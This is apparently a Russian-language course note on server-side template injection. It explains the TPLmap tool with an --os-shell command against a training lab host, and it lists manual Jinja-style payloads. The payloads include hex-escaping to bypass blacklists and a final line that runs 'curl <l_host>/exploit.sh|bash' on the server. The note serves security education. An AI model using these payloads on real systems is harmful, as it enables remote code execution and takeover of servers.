---
topic: application-security
level: intermediate
status: source-review-complete
last_reviewed: 2026-08-17
verified_against: https://owasp.org/www-project-web-security-testing-guide/latest/
---
# SSTI


> [!note] Проверка источников завершена
> Базовая линия: OWASP WSTG Latest. Исторические payload-примеры ниже сохранены для разбора, но не считаются рекомендацией для реальных систем; практику выполняйте только в назначенной лаборатории внешней учебной платформы и в пределах её правил.

> [!note] Статус материала
> Исходный конспект сохранён. Перед учебной практикой необходимо сверить команды, версии инструментов и внешние ссылки с первичными источниками.

## TPLmap
[epinna/tplmap (github.com)](https://github.com/epinna/tplmap)

TPLmap – инструмент на Python для автоматического выявления и эксплуатации уязвимостей Server-Side Template Injection. TPLmap имеет схожие с SQLmap настройки и флаги. Использует несколько различных техник и векторов (включая blind-инъекции), а также техники выполнения кода и загрузки/выгрузки произвольных файлов.

TPLmap имеет в своем арсенале техники для десятка разных движков и шаблонов. А также обладает некоторыми техниками для поиска eval()-подобных инъекций кода в Python, Ruby, PHP, JavaScript. В случае успешной эксплуатации открывает интерактивную консоль.
### Как использовать TPLmap?
- В командной строке введите команду:

```
./tplmap.py --os-shell -u http://www.hacktory.lab/
```

где,

- `./tplmap.py` – исполняемый файл программы;
- `-u --url http://www.hacktory.lab/` – URL цели;
- `--os-shell` – запускает псевдотерминал в целевой операционной системе для выполнения желаемых кодов и команд.

## Ручное тестирование [Server Side Template Injection Payloads](https://github.com/payloadbox/ssti-payloads)

![[Учебный курс — кибербезопасность/04 Безопасность приложений/05 Серверная безопасность/assets/Pasted image 20241209180532.png]]

Payload можно изменять для обхода защиты чёрного списка. А именно:
**Замена "_" на “\\x5f” и "." на "\\x2E" или объединение строк массивов. Пример:** 
```
{{"".__class__}}  
{{""["\x5f\x5fclass\x5f\x5f"]}}
```
```
{{''.__class__.__mro__[1].__subclasses__()[287]}}  
{{""["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fmro\x5f\x5f"][1]["\x5f\x5fsubclasses\x5f\x5f"]()[365]('curl <l_host>/exploit.sh|bash',shell=True,stdout=-1).communicate()}}
```
